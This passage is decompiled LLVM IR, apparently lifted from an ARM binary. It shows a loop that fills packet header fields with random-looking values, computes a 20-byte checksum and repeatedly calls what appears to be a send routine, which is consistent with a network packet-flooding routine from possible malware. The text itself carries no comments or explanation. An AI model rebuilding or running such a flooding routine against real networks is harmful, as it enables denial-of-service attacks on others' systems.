  %v4_ac18 = inttoptr i32 %v3_ac18 to i16*
  store i16 %v1_ac18, i16* %v4_ac18, align 2
  %v0_ac1c = load i32, i32* %r3.global-to-local, align 4
  %v1_ac1c = trunc i32 %v0_ac1c to i8
  %v2_ac1c = load i32, i32* @r4, align 4
  %v3_ac1c = add i32 %v2_ac1c, 13
  %v4_ac1c = inttoptr i32 %v3_ac1c to i8*
  store i8 %v1_ac1c, i8* %v4_ac1c, align 1
  %v0_ac20 = load i32, i32* @r4, align 4
  %v1_ac20 = add i32 %v0_ac20, 13
  %v2_ac20 = inttoptr i32 %v1_ac20 to i8*
  %v3_ac20 = load i8, i8* %v2_ac20, align 1
  %v4_ac20 = zext i8 %v3_ac20 to i32
  store i32 %v1_ab14, i32* %r3.global-to-local, align 4
  %v1_ac28 = and i32 %v4_ac20, 247
  %v5_ac2c = or i32 %v1_ac28, %v4_ac2c
  store i32 %v5_ac2c, i32* %r2.global-to-local, align 4
  %v1_ac30 = trunc i32 %v5_ac2c to i8
  store i8 %v1_ac30, i8* %v2_ac20, align 1
  %v0_ac34 = load i32, i32* @r4, align 4
  %v1_ac34 = add i32 %v0_ac34, 13
  %v2_ac34 = inttoptr i32 %v1_ac34 to i8*
  %v3_ac34 = load i8, i8* %v2_ac34, align 1
  %v4_ac34 = zext i8 %v3_ac34 to i32
  store i32 %v1_ab18, i32* %ip.global-to-local, align 4
  %v1_ac3c = and i32 %v4_ac34, 251
  %v5_ac40 = or i32 %v1_ac3c, %v4_ac40
  store i32 %v5_ac40, i32* %r3.global-to-local, align 4
  %v1_ac44 = trunc i32 %v5_ac40 to i8
  store i8 %v1_ac44, i8* %v2_ac34, align 1
  %v0_ac48 = load i32, i32* @r4, align 4
  %v1_ac48 = add i32 %v0_ac48, 13
  %v2_ac48 = inttoptr i32 %v1_ac48 to i8*
  %v3_ac48 = load i8, i8* %v2_ac48, align 1
  %v4_ac48 = zext i8 %v3_ac48 to i32
  store i32 %v1_ab1c, i32* %r0.global-to-local, align 4
  %v1_ac50 = and i32 %v4_ac48, 253
  %v4_ac54 = or i32 %v1_ac50, %v3_ac54
  store i32 %v4_ac54, i32* %r2.global-to-local, align 4
  %v1_ac58 = trunc i32 %v4_ac54 to i8
  store i8 %v1_ac58, i8* %v2_ac48, align 1
  %v0_ac5c = load i32, i32* @r4, align 4
  %v1_ac5c = add i32 %v0_ac5c, 13
  %v2_ac5c = inttoptr i32 %v1_ac5c to i8*
  %v3_ac5c = load i8, i8* %v2_ac5c, align 1
  %v4_ac5c = zext i8 %v3_ac5c to i32
  store i32 %v1_ab20, i32* %r1.global-to-local, align 4
  %v1_ac64 = and i32 %v4_ac5c, 254
  %v2_ac68 = or i32 %v1_ac64, %v1_ab20
  store i32 %v2_ac68, i32* %r3.global-to-local, align 4
  %v1_ac6c = trunc i32 %v2_ac68 to i8
  store i8 %v1_ac6c, i8* %v2_ac5c, align 1
  %v0_ac70 = call i32 @function_e0b4()
  %v1_ac70 = trunc i32 %v0_ac70 to i16
  store i32 %v0_ac70, i32* %r0.global-to-local, align 4
  store i32 %v1_ab24, i32* %r2.global-to-local, align 4
  store i1 %v2_ac78, i1* %cpsr_z.global-to-local, align 1
  %v3_ac84.pre = load i32, i32* @r4, align 4
  br i1 %v2_ac78, label %.thread3, label %bb68

bb68:                                             ; preds = %.thread
  %v2_ac7c = add i32 %v3_ac84.pre, 13
  %v3_ac7c = inttoptr i32 %v2_ac7c to i8*
  %v4_ac7c = load i8, i8* %v3_ac7c, align 1
  %v5_ac7c = zext i8 %v4_ac7c to i32
  %v2_ac80 = or i32 %v5_ac7c, 8
  store i32 %v2_ac80, i32* @r3, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb68
  %v4_ac84 = add i32 %v3_ac84.pre, 14
  %v5_ac84 = inttoptr i32 %v4_ac84 to i16*
  store i16 %v1_ac70, i16* %v5_ac84, align 2
  store i32 %v6_a9d4, i32* %r1.global-to-local, align 4
  %v0_ac8c = load i32, i32* @r5, align 4
  %v1_ac8c = add i32 %v0_ac8c, 40
  store i32 %v1_ac8c, i32* %r0.global-to-local, align 4
  br i1 %v2_ac78, label %bb70, label %bb69

bb69:                                             ; preds = %.thread3
  %v1_ac90 = load i32, i32* @r3, align 4
  %v2_ac90 = trunc i32 %v1_ac90 to i8
  %v3_ac90 = load i32, i32* @r4, align 4
  %v4_ac90 = add i32 %v3_ac90, 13
  %v5_ac90 = inttoptr i32 %v4_ac90 to i8*
  store i8 %v2_ac90, i8* %v5_ac90, align 1
  br label %bb70

bb70:                                             ; preds = %.thread3, %bb69
  %v2_ac94 = inttoptr i32 %v1_ac8c to i16*
  %v3_ac94 = call i32 @function_e248(i16* %v2_ac94, i32 %v6_a9d4)
  store i32 %v3_ac94, i32* %r0.global-to-local, align 4
  %v3_ac98 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ac98, i32* %r3.global-to-local, align 4
  %v1_ac9c = add i32 %v3_ac98, 1
  store i32 %v1_ac9c, i32* @r4, align 4
  %v1_aca0 = load i32, i32* @r7, align 4
  %v9_aca0 = icmp eq i32 %v1_ac9c, %v1_aca0
  store i1 %v9_aca0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ac9c, i32* %stack_var_-44, align 4
  %v5_aca8 = icmp slt i32 %v1_ac9c, %v1_aca0
  br i1 %v5_aca8, label %dec_label_pc_ab44, label %dec_label_pc_acac

dec_label_pc_acac:                                ; preds = %bb70
  store i32 %v6_a9d4, i32* %r3.global-to-local, align 4
  %v1_acb0 = add i32 %v6_a9d4, 20
  store i32 %v1_acb0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_acb8

dec_label_pc_acb8:                                ; preds = %dec_label_pc_aefc, %dec_label_pc_acac
  %v0_acd08 = phi i32 [ %v1_aca0, %dec_label_pc_acac ], [ 0, %dec_label_pc_aefc ]
  %stack_var_-140.0 = phi i32 [ %v3_aa94, %dec_label_pc_acac ], [ %v3_af08, %dec_label_pc_aefc ]
  %storemerge = add i32 %v6_a9d4, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_acbc = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_acbc, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_acbc, 256
  %v3_acc4 = and i32 %tmp71, 65280
  store i32 %v3_acc4, i32* %r3.global-to-local, align 4
  %v4_acc8 = udiv i32 %v1_acbc, 16777216
  %v5_acc8 = or i32 %v3_acc4, %v4_acc8
  store i32 %v5_acc8, i32* @sl, align 4
  %v3_ae68 = icmp eq i32 %v3_aa6c, 65535
  %v2_aecc = icmp eq i32 %v1_a9fc, 0
  %v2_ad08 = icmp eq i32 %v6_aa10, -1
  %v7_ad08 = icmp eq i32 %v6_aa10, -1
  br label %dec_label_pc_accc

dec_label_pc_accc:                                ; preds = %dec_label_pc_accc, %dec_label_pc_ade4, %dec_label_pc_acb8
  %v0_acd0 = phi i32 [ %v0_acd08, %dec_label_pc_acb8 ], [ 0, %dec_label_pc_ade4 ], [ 0, %dec_label_pc_accc ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_acd0 = icmp eq i32 %v0_acd0, 0
  store i1 %v2_acd0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_acd0, label %dec_label_pc_accc, label %dec_label_pc_acdc

dec_label_pc_acdc:                                ; preds = %dec_label_pc_accc, %dec_label_pc_ade4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ace0

dec_label_pc_ace0:                                ; preds = %dec_label_pc_ad60, %dec_label_pc_acdc
  %v1_acf4 = phi i32 [ %v1_add4, %dec_label_pc_ad60 ], [ 0, %dec_label_pc_acdc ]
  %v5_ace4 = mul i32 %v1_acf4, 24
  %v1_ace8 = load i32, i32* @r8, align 4
  %v2_ace8 = add i32 %v1_ace8, %v5_ace4
  store i32 %v2_ace8, i32* %r3.global-to-local, align 4
  store i32 %v2_a840, i32* %ip.global-to-local, align 4
  %v1_acf0 = add i32 %v2_ace8, 20
  %v2_acf0 = inttoptr i32 %v1_acf0 to i8*
  %v3_acf0 = load i8, i8* %v2_acf0, align 1
  %v4_acf0 = zext i8 %v3_acf0 to i32
  store i32 %v4_acf0, i32* %r2.global-to-local, align 4
  %v4_acf4 = mul i32 %v1_acf4, 4
  %v5_acf4 = add i32 %v4_acf4, %v2_a840
  %v6_acf4 = inttoptr i32 %v5_acf4 to i32*
  %v7_acf4 = load i32, i32* %v6_acf4, align 4
  store i32 %v7_acf4, i32* @r5, align 4
  %v7_acf8 = icmp eq i8 %v3_acf0, 31
  store i1 %v7_acf8, i1* %cpsr_z.global-to-local, align 1
  %v1_acfc = add i32 %v7_acf4, 20
  store i32 %v1_acfc, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_acf0, 32
  br i1 %tmp77, label %dec_label_pc_adf8, label %dec_label_pc_ad04

dec_label_pc_ad04:                                ; preds = %dec_label_pc_ace0
  store i32 %v6_aa10, i32* %r0.global-to-local, align 4
  store i1 %v7_ad08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad08, label %dec_label_pc_ae58, label %dec_label_pc_ad10

dec_label_pc_ad10:                                ; preds = %dec_label_pc_adf8, %dec_label_pc_ad04
  store i32 %v3_aa6c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_ae68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ae68, label %dec_label_pc_ae74, label %dec_label_pc_ad24

dec_label_pc_ad24:                                ; preds = %dec_label_pc_ae58.dec_label_pc_ad24_crit_edge, %dec_label_pc_ad10
  %v1_ad28 = phi i32 [ %v1_ad28.pre, %dec_label_pc_ae58.dec_label_pc_ad24_crit_edge ], [ 65535, %dec_label_pc_ad10 ]
  store i32 %v3_aa70, i32* %r2.global-to-local, align 4
  %v9_ad28 = icmp eq i32 %v3_aa70, %v1_ad28
  store i1 %v9_ad28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad28, label %dec_label_pc_ae88, label %dec_label_pc_ad30

dec_label_pc_ad30:                                ; preds = %dec_label_pc_ae74.dec_label_pc_ad30_crit_edge, %dec_label_pc_ad24
  %v1_ad34 = phi i32 [ %v1_ad34.pre, %dec_label_pc_ae74.dec_label_pc_ad30_crit_edge ], [ %v1_ad28, %dec_label_pc_ad24 ]
  store i32 %v3_aa74, i32* %r3.global-to-local, align 4
  %v9_ad34 = icmp eq i32 %v3_aa74, %v1_ad34
  store i1 %v9_ad34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad34, label %dec_label_pc_ae9c, label %dec_label_pc_ad3c

dec_label_pc_ad3c:                                ; preds = %dec_label_pc_ae88.dec_label_pc_ad3c_crit_edge, %dec_label_pc_ad30
  %v1_ad40 = phi i32 [ %v1_ad40.pre, %dec_label_pc_ae88.dec_label_pc_ad3c_crit_edge ], [ %v1_ad34, %dec_label_pc_ad30 ]
  store i32 %v6_a910, i32* %ip.global-to-local, align 4
  %v9_ad40 = icmp eq i32 %v6_a910, %v1_ad40
  store i1 %v9_ad40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad40, label %dec_label_pc_aeb0, label %dec_label_pc_ad48

dec_label_pc_ad48:                                ; preds = %dec_label_pc_ae9c.dec_label_pc_ad48_crit_edge, %dec_label_pc_ad3c
  %v1_ad4c = phi i32 [ %v1_ad4c.pre, %dec_label_pc_ae9c.dec_label_pc_ad48_crit_edge ], [ %v1_ad40, %dec_label_pc_ad3c ]
  store i32 %v6_a92c, i32* %r0.global-to-local, align 4
  %v9_ad4c = icmp eq i32 %v6_a92c, %v1_ad4c
  store i1 %v9_ad4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad4c, label %dec_label_pc_aec4, label %dec_label_pc_ad54

dec_label_pc_ad54:                                ; preds = %dec_label_pc_aeb0, %dec_label_pc_ad48
  store i32 %v1_a9fc, i32* %r1.global-to-local, align 4
  store i1 %v2_aecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aecc, label %dec_label_pc_ad60, label %dec_label_pc_aed8

dec_label_pc_ad60:                                ; preds = %dec_label_pc_ad54, %dec_label_pc_aec4, %dec_label_pc_aed8
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ad64 = load i32, i32* @r5, align 4
  %v3_ad64 = add i32 %v2_ad64, 10
  %v4_ad64 = inttoptr i32 %v3_ad64 to i16*
  store i16 0, i16* %v4_ad64, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ad6c = load i32, i32* @r5, align 4
  store i32 %v0_ad6c, i32* @r0, align 4
  %v2_ad70 = call i32 @function_c848(i32 %v0_ad6c, i32 20)
  %v3_ad70 = trunc i32 %v2_ad70 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ad78 = load i32, i32* @r5, align 4
  %v4_ad78 = add i32 %v3_ad78, 10
  %v5_ad78 = inttoptr i32 %v4_ad78 to i16*
  store i16 %v3_ad70, i16* %v5_ad78, align 2
  %v0_ad7c = load i32, i32* @r6, align 4
  store i32 %v0_ad7c, i32* @r1, align 4
  %v0_ad80 = load i32, i32* %r3.global-to-local, align 4
  %v1_ad80 = trunc i32 %v0_ad80 to i16
  %v3_ad80 = add i32 %v0_ad7c, 16
  %v4_ad80 = inttoptr i32 %v3_ad80 to i16*
  store i16 %v1_ad80, i16* %v4_ad80, align 2
  %v0_ad84 = load i32, i32* @sl, align 4
  store i32 %v0_ad84, i32* %r2.global-to-local, align 4
  %v0_ad88 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_ad88, i32* %r3.global-to-local, align 4
  %v0_ad8c = load i32, i32* @r5, align 4
  store i32 %v0_ad8c, i32* %r0.global-to-local, align 4
  %v4_ad90 = call i32 @function_c898(i32 %v0_ad8c, i32 %v0_ad7c, i32 %v0_ad84, i32 %v0_ad88)
  %v5_ad90 = trunc i32 %v4_ad90 to i16
  store i32 %v4_ad90, i32* %r0.global-to-local, align 4
  %v3_ad94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ad94, i32* %r3.global-to-local, align 4
  %v3_ad98 = mul i32 %v3_ad94, 32
  store i32 %v3_ad98, i32* %lr.global-to-local, align 4
  %v3_ad9c = load i32, i32* @r6, align 4
  %v4_ad9c = add i32 %v3_ad9c, 16
  %v5_ad9c = inttoptr i32 %v4_ad9c to i16*
  store i16 %v5_ad90, i16* %v5_ad9c, align 2
  %v0_ada0 = load i32, i32* %lr.global-to-local, align 4
  %v1_ada0 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_ada0, -8
  %v5_ada0 = add i32 %v0_ada0, %tmp78
  store i32 %v5_ada0, i32* %lr.global-to-local, align 4
  %v0_ada4 = load i32, i32* @r6, align 4
  %v1_ada4 = add i32 %v0_ada4, 2
  %v2_ada4 = inttoptr i32 %v1_ada4 to i16*
  %v3_ada4 = load i16, i16* %v2_ada4, align 2
  %v1_ada8 = load i32, i32* @r8, align 4
  %v2_ada8 = add i32 %v1_ada8, %v5_ada0
  store i32 %v2_ada8, i32* @lr, align 4
  %v3_adac = add i32 %v2_ada8, 2
  %v4_adac = inttoptr i32 %v3_adac to i16*
  store i16 %v3_ada4, i16* %v4_adac, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_adb8 = load i32, i32* @r5, align 4
  store i32 %v0_adb8, i32* %r1.global-to-local, align 4
  store i32 %v3_aa24, i32* %r0.global-to-local, align 4
  %v0_adc0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_adc0, i32* %r2.global-to-local, align 4
  %v0_adc4 = load i32, i32* @lr, align 4
  %v6_adcc = call i32 @function_11560(i32 %v3_aa24, i32 %v0_adb8, i32 %v0_adc0, i32 16384, i32 %v0_adc4, i32 16)
  %v3_add0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_add0, i32* %r3.global-to-local, align 4
  %v1_add4 = add i32 %v3_add0, 1
  store i32 %v1_add4, i32* %r0.global-to-local, align 4
  %v1_add8 = load i32, i32* @r7, align 4
  %v9_add8 = icmp eq i32 %v1_add4, %v1_add8
  store i1 %v9_add8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_add4, i32* %stack_var_-44, align 4
  %v5_ade0 = icmp slt i32 %v1_add4, %v1_add8
  br i1 %v5_ade0, label %dec_label_pc_ace0, label %dec_label_pc_ade4

dec_label_pc_ade4:                                ; preds = %dec_label_pc_ad60
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ade8 = icmp eq i32 %v1_add8, 0
  store i1 %v2_ade8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ade8, label %dec_label_pc_accc, label %dec_label_pc_acdc

dec_label_pc_adf8:                                ; preds = %dec_label_pc_ace0
  %v1_adf8 = add i32 %v2_ace8, 16
  %v2_adf8 = inttoptr i32 %v1_adf8 to i32*
  %v3_adf8 = load i32, i32* %v2_adf8, align 4
  %v0_adfc = call i32 @function_e0b4()
  store i32 %v0_adfc, i32* %r0.global-to-local, align 4
  %v3_ae00 = load i32, i32* %stack_var_-44, align 4
  %v5_ae08 = mul i32 %v3_ae00, 24
  %v1_ae0c = and i32 %v3_adf8, 16711680
  store i32 %v1_ae0c, i32* %ip.global-to-local, align 4
  %v3_ae10 = udiv i32 %v3_adf8, 16777216
  %v4_ae14 = udiv i32 %v1_ae0c, 256
  %v5_ae14 = or i32 %v4_ae14, %v3_ae10
  store i32 %v5_ae14, i32* %r2.global-to-local, align 4
  %v1_ae18 = load i32, i32* @r8, align 4
  %v2_ae18 = add i32 %v1_ae18, %v5_ae08
  store i32 %v2_ae18, i32* %r1.global-to-local, align 4
  %v1_ae1c = and i32 %v3_adf8, 65280
  store i32 %v1_ae1c, i32* %r3.global-to-local, align 4
  %v1_ae20 = add i32 %v2_ae18, 20
  %v2_ae20 = inttoptr i32 %v1_ae20 to i8*
  %v3_ae20 = load i8, i8* %v2_ae20, align 1
  %v4_ae20 = zext i8 %v3_ae20 to i32
  store i32 %v4_ae20, i32* %ip.global-to-local, align 4
  %v5_ae28 = call i32 @llvm.bswap.i32(i32 %v3_adf8)
  %v7_ae2c = lshr i32 %v0_adfc, %v4_ae20
  %v8_ae2c = add i32 %v7_ae2c, %v5_ae28
  store i32 %v8_ae2c, i32* %r2.global-to-local, align 4
  %v1_ae3c = and i32 %v8_ae2c, 65280
  store i32 %v1_ae3c, i32* %r1.global-to-local, align 4
  store i32 %v6_aa10, i32* %r0.global-to-local, align 4
  %v5_ae48 = call i32 @llvm.bswap.i32(i32 %v8_ae2c)
  store i32 %v5_ae48, i32* %r3.global-to-local, align 4
  store i1 %v7_ad08, i1* %cpsr_z.global-to-local, align 1
  %v1_ae50 = load i32, i32* @r5, align 4
  %v2_ae50 = add i32 %v1_ae50, 16
  %v3_ae50 = inttoptr i32 %v2_ae50 to i32*
  store i32 %v5_ae48, i32* %v3_ae50, align 4
  br i1 %v2_ad08, label %dec_label_pc_ae58, label %dec_label_pc_ad10

dec_label_pc_ae58:                                ; preds = %dec_label_pc_adf8, %dec_label_pc_ad04
  %v0_ae58 = call i32 @function_e0b4()
  store i32 %v0_ae58, i32* %r0.global-to-local, align 4
  store i32 %v3_aa6c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_ae68, i1* %cpsr_z.global-to-local, align 1
  %v1_ae6c = load i32, i32* @r5, align 4
  %v2_ae6c = add i32 %v1_ae6c, 12
  %v3_ae6c = inttoptr i32 %v2_ae6c to i32*
  store i32 %v0_ae58, i32* %v3_ae6c, align 4
  br i1 %v3_ae68, label %dec_label_pc_ae74, label %dec_label_pc_ae58.dec_label_pc_ad24_crit_edge

dec_label_pc_ae58.dec_label_pc_ad24_crit_edge:    ; preds = %dec_label_pc_ae58
  %v1_ad28.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad24

dec_label_pc_ae74:                                ; preds = %dec_label_pc_ae58, %dec_label_pc_ad10
  %v0_ae74 = call i32 @function_e0b4()
  %v1_ae74 = trunc i32 %v0_ae74 to i16
  store i32 %v0_ae74, i32* %r0.global-to-local, align 4
  store i32 %v3_aa70, i32* %r2.global-to-local, align 4
  %v1_ae7c = load i32, i32* @r4, align 4
  %v9_ae7c = icmp eq i32 %v3_aa70, %v1_ae7c
  store i1 %v9_ae7c, i1* %cpsr_z.global-to-local, align 1
  %v3_ae80 = load i32, i32* @r5, align 4
  %v4_ae80 = add i32 %v3_ae80, 4
  %v5_ae80 = inttoptr i32 %v4_ae80 to i16*
  store i16 %v1_ae74, i16* %v5_ae80, align 2
  br i1 %v9_ae7c, label %dec_label_pc_ae88, label %dec_label_pc_ae74.dec_label_pc_ad30_crit_edge

dec_label_pc_ae74.dec_label_pc_ad30_crit_edge:    ; preds = %dec_label_pc_ae74
  %v1_ad34.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad30

dec_label_pc_ae88:                                ; preds = %dec_label_pc_ae74, %dec_label_pc_ad24
  %v0_ae88 = call i32 @function_e0b4()
  %v1_ae88 = trunc i32 %v0_ae88 to i16
  store i32 %v0_ae88, i32* %r0.global-to-local, align 4
  store i32 %v3_aa74, i32* %r3.global-to-local, align 4
  %v1_ae90 = load i32, i32* @r4, align 4
  %v9_ae90 = icmp eq i32 %v3_aa74, %v1_ae90
  store i1 %v9_ae90, i1* %cpsr_z.global-to-local, align 1
  %v3_ae94 = load i32, i32* @r5, align 4
  %v4_ae94 = add i32 %v3_ae94, 20
  %v5_ae94 = inttoptr i32 %v4_ae94 to i16*
  store i16 %v1_ae88, i16* %v5_ae94, align 2
  br i1 %v9_ae90, label %dec_label_pc_ae9c, label %dec_label_pc_ae88.dec_label_pc_ad3c_crit_edge

dec_label_pc_ae88.dec_label_pc_ad3c_crit_edge:    ; preds = %dec_label_pc_ae88
  %v1_ad40.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad3c

dec_label_pc_ae9c:                                ; preds = %dec_label_pc_ae88, %dec_label_pc_ad30
  %v0_ae9c = call i32 @function_e0b4()
  %v1_ae9c = trunc i32 %v0_ae9c to i16
  store i32 %v0_ae9c, i32* %r0.global-to-local, align 4
  store i32 %v6_a910, i32* %ip.global-to-local, align 4
  %v1_aea4 = load i32, i32* @r4, align 4
  %v9_aea4 = icmp eq i32 %v6_a910, %v1_aea4
  store i1 %v9_aea4, i1* %cpsr_z.global-to-local, align 1
  %v3_aea8 = load i32, i32* @r6, align 4
  %v4_aea8 = add i32 %v3_aea8, 2
  %v5_aea8 = inttoptr i32 %v4_aea8 to i16*
  store i16 %v1_ae9c, i16* %v5_aea8, align 2
  br i1 %v9_aea4, label %dec_label_pc_aeb0, label %dec_label_pc_ae9c.dec_label_pc_ad48_crit_edge

dec_label_pc_ae9c.dec_label_pc_ad48_crit_edge:    ; preds = %dec_label_pc_ae9c
  %v1_ad4c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad48

dec_label_pc_aeb0:                                ; preds = %dec_label_pc_ae9c, %dec_label_pc_ad3c
  %v0_aeb0 = call i32 @function_e0b4()
  %v1_aeb4 = load i32, i32* @r6, align 4
  %v2_aeb4 = add i32 %v1_aeb4, 4
  %v3_aeb4 = inttoptr i32 %v2_aeb4 to i32*
  store i32 %v0_aeb0, i32* %v3_aeb4, align 4
  store i32 %v6_a92c, i32* %r0.global-to-local, align 4
  %v1_aebc = load i32, i32* @r4, align 4
  %v9_aebc = icmp eq i32 %v6_a92c, %v1_aebc
  store i1 %v9_aebc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aebc, label %dec_label_pc_aec4, label %dec_label_pc_ad54

dec_label_pc_aec4:                                ; preds = %dec_label_pc_aeb0, %dec_label_pc_ad48
  %v0_aec4 = call i32 @function_e0b4()
  store i32 %v0_aec4, i32* %r0.global-to-local, align 4
  store i32 %v1_a9fc, i32* %r1.global-to-local, align 4
  store i1 %v2_aecc, i1* %cpsr_z.global-to-local, align 1
  %v1_aed0 = load i32, i32* @r6, align 4
  %v2_aed0 = add i32 %v1_aed0, 8
  %v3_aed0 = inttoptr i32 %v2_aed0 to i32*
  store i32 %v0_aec4, i32* %v3_aed0, align 4
  br i1 %v2_aecc, label %dec_label_pc_ad60, label %dec_label_pc_aed8

dec_label_pc_aed8:                                ; preds = %dec_label_pc_ad54, %dec_label_pc_aec4
  %v0_aed8 = load i32, i32* @r5, align 4
  %v1_aed8 = add i32 %v0_aed8, 40
  store i32 %v1_aed8, i32* %r0.global-to-local, align 4
  store i32 %v6_a9d4, i32* %r1.global-to-local, align 4
  %v2_aee0 = inttoptr i32 %v1_aed8 to i16*
  %v3_aee0 = call i32 @function_e248(i16* %v2_aee0, i32 %v6_a9d4)
  store i32 %v3_aee0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ad60

dec_label_pc_aee8:                                ; preds = %dec_label_pc_aa34
  store i32 %v3_aa24, i32* %r0.global-to-local, align 4
  %v1_aeec = call i32 @function_10dd8(i32 %v3_aa24)
  store i32 %v1_aeec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aef0

dec_label_pc_aef0:                                ; preds = %dec_label_pc_a824, %dec_label_pc_aee8
  %v1_aef8 = phi i32 [ %v3_aa24, %dec_label_pc_a824 ], [ %v1_aeec, %dec_label_pc_aee8 ]
  store i32 %v18_a824, i32* %sb.global-to-local, align 4
  store i32 %v24_a824, i32* %fp.global-to-local, align 4
  store i32 %v27_a824, i32* %lr.global-to-local, align 4
  ret i32 %v1_aef8

dec_label_pc_aefc:                                ; preds = %dec_label_pc_aa5c
  store i32 %v6_a9d4, i32* %r0.global-to-local, align 4
  %v1_af04 = add i32 %v6_a9d4, 20
  store i32 %v1_af04, i32* %sb.global-to-local, align 4
  %v3_af08 = mul i32 %v6_a9d4, 65536
  store i32 %v3_af08, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_acb8

; uselistorder directives
  uselistorder i32 %v0_ae9c, { 1, 0 }
  uselistorder i32 %v0_ae88, { 1, 0 }
  uselistorder i32 %v0_ae74, { 1, 0 }
  uselistorder i32 %v5_ae48, { 1, 0 }
  uselistorder i32 %v3_adf8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_add4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ada0, { 1, 0 }
  uselistorder i32 %v4_ad90, { 1, 0 }
  uselistorder i1 %v7_ad08, { 2, 1, 0 }
  uselistorder i1 %v2_aecc, { 2, 3, 1, 0 }
  uselistorder i1 %v3_ae68, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_ac9c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ac70, { 1, 0 }
  uselistorder i32 %v1_ab24, { 1, 2, 0 }
  uselistorder i32 %v1_ab20, { 2, 1, 0 }
  uselistorder i32 %v1_ab1c, { 2, 0, 1 }
  uselistorder i32 %v1_ab18, { 2, 0, 1 }
  uselistorder i32 %v1_ab14, { 2, 0, 1 }
  uselistorder i32 %v1_aaec, { 1, 0 }
  uselistorder i32 %v3_aa94, { 1, 0 }
  uselistorder i32 %v3_aa6c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_aa64, { 1, 0, 2 }
  uselistorder i32 %v0_aa60, { 1, 0, 2 }
  uselistorder i32 %v0_aa5c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_aa54, { 1, 0 }
  uselistorder i1 %v7_aa28, { 1, 0 }
  uselistorder i32 %v3_aa24, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_aa10, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_a9fc, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_a9d4, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_a92c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_a910, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_a8c0, { 1, 2, 0 }
  uselistorder i32 %v5_a8b4, { 0, 2, 1 }
  uselistorder i32 %v5_a87c, { 0, 2, 1 }
  uselistorder i32 %v2_a840, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 37, 36, 39, 38, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 27, 23, 24, 25, 26, 31, 28, 29, 30, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
